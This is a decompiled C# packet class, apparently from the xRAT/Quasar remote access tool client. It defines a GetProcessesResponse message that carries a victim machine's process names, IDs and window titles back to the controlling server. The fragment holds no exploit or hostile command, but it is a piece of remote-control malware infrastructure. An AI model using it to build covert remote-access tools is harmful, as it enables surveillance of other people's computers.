using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ClientPackets
{
	// Token: 0x02000086 RID: 134
	[Serializable]
	public class GetProcessesResponse : IPacket
	{
		// Token: 0x17000081 RID: 129
		// (get) Token: 0x06000380 RID: 896 RVA: 0x00003BA5 File Offset: 0x00001DA5
		// (set) Token: 0x06000381 RID: 897 RVA: 0x00003BAD File Offset: 0x00001DAD
		public string[] Processes { get; set; }

		// Token: 0x17000082 RID: 130
		// (get) Token: 0x06000382 RID: 898 RVA: 0x00003BB6 File Offset: 0x00001DB6
		// (set) Token: 0x06000383 RID: 899 RVA: 0x00003BBE File Offset: 0x00001DBE
		public int[] IDs { get; set; }

		// Token: 0x17000083 RID: 131
		// (get) Token: 0x06000384 RID: 900 RVA: 0x00003BC7 File Offset: 0x00001DC7
		// (set) Token: 0x06000385 RID: 901 RVA: 0x00003BCF File Offset: 0x00001DCF
		public string[] Titles { get; set; }

		// Token: 0x06000386 RID: 902 RVA: 0x000021D4 File Offset: 0x000003D4
		public GetProcessesResponse()
		{
		}

		// Token: 0x06000387 RID: 903 RVA: 0x00003BD8 File Offset: 0x00001DD8
		public GetProcessesResponse(string[] processes, int[] ids, string[] titles)
		{
			this.Processes = processes;
			this.IDs = ids;
			this.Titles = titles;
		}

		// Token: 0x06000388 RID: 904 RVA: 0x00003BF5 File Offset: 0x00001DF5
		public void Execute(Client client)
		{
			client.Send<GetProcessesResponse>(this);
		}
	}
}
